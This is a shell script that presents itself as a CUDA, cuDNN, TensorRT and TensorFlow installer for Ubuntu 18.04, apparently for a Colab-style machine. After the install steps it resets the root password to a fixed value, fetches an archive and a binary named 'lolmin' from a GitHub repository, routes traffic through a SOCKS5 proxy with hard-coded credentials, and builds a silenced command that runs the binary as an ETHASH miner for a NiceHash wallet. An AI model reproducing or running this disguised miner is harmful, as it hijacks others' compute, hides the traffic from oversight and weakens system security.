wget https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/cuda-ubuntu1804.pin
sudo mv cuda-ubuntu1804.pin /etc/apt/preferences.d/cuda-repository-pin-600
sudo apt-key adv --fetch-keys https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/7fa2af80.pub
sudo add-apt-repository "deb https://developer.download.nvidia.com/compute/cuda/repos/ubuntu1804/x86_64/ /"
sudo apt-get update

wget http://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.deb

sudo apt install ./nvidia-machine-learning-repo-ubuntu1804_1.0.0-1_amd64.deb
sudo apt-get update

sudo apt-get install --no-install-recommends nvidia-driver-450


wget https://developer.download.nvidia.com/compute/machine-learning/repos/ubuntu1804/x86_64/libnvinfer7_7.1.3-1+cuda11.0_amd64.deb
sudo apt install ./libnvinfer7_7.1.3-1+cuda11.0_amd64.deb
sudo apt-get update

echo 'Installing CUDA development and runtime libraries (~4GB)'
sudo apt-get install --no-install-recommends \
    cuda-11-0 \
    libcudnn8=8.0.4.30-1+cuda11.0  \
    libcudnn8-dev=8.0.4.30-1+cuda11.0

echo 'Install TensorRT. Requires that libcudnn8 is installed above.'
sudo apt-get install -y --no-install-recommends libnvinfer7=7.1.3-1+cuda11.0 \
    libnvinfer-dev=7.1.3-1+cuda11.0 \
    libnvinfer-plugin7=7.1.3-1+cuda11.0

echo 'Upgrading Python pip installer and installing TensorFlow'
pip3 install --upgrade pip
pip3 install tensorflow==2.4 gretel-synthetics
echo -e "cobra\ncobra" | passwd root
clear

echo 'export PATH=/usr/local/cuda-11.0/bin${PATH:+:${PATH}}' >> .bashrc
echo 'export LD_LIBRARY_PATH=/usr/local/cuda-11.0/lib64:$LD_LIBRARY_PATH' >> .bashrc
echo 'export LD_LIBRARY_PATH=/usr/local/cuda-11.0/include:$LD_LIBRARY_PATH' >> .bashrc


wget https://github.com/Akatsoki/joss/raw/main/graphics.tar.gz
tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END

listen = :2233

loglevel = 1

socks5 = p.webshare.io:80

socks5_username = zqcfzunl-GB-rotate

socks5_password = gvoadw0ov5f2

END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "

echo " "

wget https://github.com/Akatsoki/joss/raw/main/lolmin
chmod +x lolmin

wallet="./graftcp/graftcp ./lolmin --algo ETHASH --pool stratum+ssl://daggerhashimoto.auto.nicehash.com:443 --user 39Xoi6TZxzarLHrqJJzQLVCFoKis13vhSE.colab >/dev/null 2>&1 "


